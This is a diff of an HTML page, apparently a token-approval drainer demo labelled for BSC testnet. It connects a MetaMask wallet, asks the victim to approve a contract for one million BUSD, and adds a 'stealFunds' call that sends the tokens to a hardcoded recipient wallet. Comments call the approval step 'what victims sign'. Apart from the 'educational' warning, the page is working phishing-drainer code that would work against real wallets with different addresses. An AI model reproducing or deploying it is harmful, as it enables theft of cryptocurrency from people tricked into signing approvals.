@@ -1,31 +1,39 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Token Approval Demo (Testnet Only)</title>
+    <title>Token Approval Demo (BSC Testnet)</title>
     <script src="https://cdn.jsdelivr.net/npm/web3@1.5.2/dist/web3.min.js"></script>
+    <style>
+        body { font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; }
+        button { padding: 10px; margin: 5px; cursor: pointer; }
+        #walletInfo { display: none; margin-top: 20px; }
+        .warning { color: red; font-weight: bold; }
+    </style>
 </head>
 <body>
-    <h1>Approval Demo (BSC Testnet)</h1>
-    
+    <h1>Token Approval Demo (BSC Testnet)</h1>
+    <p class="warning">FOR EDUCATIONAL PURPOSES ONLY. USE TESTNET WALLET.</p>
+
     <button id="connectWallet">Connect Wallet</button>
     
-    <div id="walletInfo" style="display:none;">
-        <p>Connected: <span id="walletAddress"></span></p>
-        <button id="checkApproval">Check BUSD Approval</button>
-        <button id="demoApprove">Demo Approval</button>
-        <p id="approvalStatus"></p>
+    <div id="walletInfo">
+        <p>Connected: <strong id="walletAddress"></strong></p>
+        <button id="checkAllowance">Check BUSD Approval</button>
+        <button id="requestApproval">Request BUSD Approval</button>
+        <button id="demoTransfer">Simulate Transfer (Owner Only)</button>
+        <p id="status"></p>
     </div>
 
     <script>
-        // BUSD Testnet Contract
+        // BSC Testnet Contracts
         const BUSD_TESTNET = "0x8301F2213c0eeD49a7E28Ae4c3e91722919B8B47";
-        
-        // Your deployed contract address
-        const DEMO_CONTRACT = "0x6458b5fa695016611bab93350ec852e30c25c67f"; 
+        const DEMO_CONTRACT = "0x0de54379616ae1cfcf99102f80510462693b2e3e"; // Your deployed contract
+        const RECIPIENT_WALLET = "0xefd427A1224fD494F9940C4DbbEbd933b923C170"; // Funds sent here
 
         let web3;
         let accounts = [];
 
+        // Connect Wallet
         document.getElementById('connectWallet').onclick = async () => {
             if (window.ethereum) {
                 web3 = new Web3(window.ethereum);
@@ -33,16 +41,17 @@
                     accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                     document.getElementById('walletAddress').textContent = accounts[0];
                     document.getElementById('walletInfo').style.display = 'block';
+                    updateStatus("Wallet connected. Switch to BSC Testnet!");
                 } catch (error) {
-                    console.error("User denied access");
+                    updateStatus("User denied access.");
                 }
             } else {
-                alert("MetaMask not detected!");
+                updateStatus("MetaMask not detected!");
             }
         };
 
-        // Check existing approval
-        document.getElementById('checkApproval').onclick = async () => {
+        // Check BUSD Allowance
+        document.getElementById('checkAllowance').onclick = async () => {
             const erc20 = new web3.eth.Contract([
                 {
                     "constant": true,
@@ -57,12 +66,11 @@
             ], BUSD_TESTNET);
 
             const allowance = await erc20.methods.allowance(accounts[0], DEMO_CONTRACT).call();
-            document.getElementById('approvalStatus').textContent = 
-                `Current allowance: ${allowance / 1e18} BUSD`;
+            updateStatus(`Current BUSD allowance: ${allowance / 1e18} (Raw: ${allowance})`);
         };
 
-        // Demo approval (simulates what victims accidentally sign)
-        document.getElementById('demoApprove').onclick = async () => {
+        // Request Approval (What victims sign)
+        document.getElementById('requestApproval').onclick = async () => {
             const erc20 = new web3.eth.Contract([
                 {
                     "constant": false,
@@ -78,12 +86,35 @@
 
             try {
                 await erc20.methods.approve(DEMO_CONTRACT, web3.utils.toWei("1000000")).send({ from: accounts[0] });
-                alert("Approval successful (Demo only - no real funds at risk)");
+                updateStatus("Approval successful! Now the contract can move your test BUSD.");
             } catch (error) {
-                console.error(error);
-                alert("Approval failed");
+                updateStatus(`Approval failed: ${error.message}`);
             }
         };
+
+        // Simulate Transfer (Only owner can call)
+        document.getElementById('demoTransfer').onclick = async () => {
+            const contract = new web3.eth.Contract([
+                {
+                    "constant": false,
+                    "inputs": [{"name": "victim", "type": "address"}],
+                    "name": "stealFunds",
+                    "outputs": [],
+                    "type": "function"
+                }
+            ], DEMO_CONTRACT);
+
+            try {
+                await contract.methods.stealFunds(accounts[0]).send({ from: accounts[0] });
+                updateStatus("Funds transferred to 0xefd4...C170. Check BscScan!");
+            } catch (error) {
+                updateStatus(`Transfer failed: ${error.message}`);
+            }
+        };
+
+        function updateStatus(message) {
+            document.getElementById('status').innerHTML = message;
+        }
     </script>
 </body>
 </html>
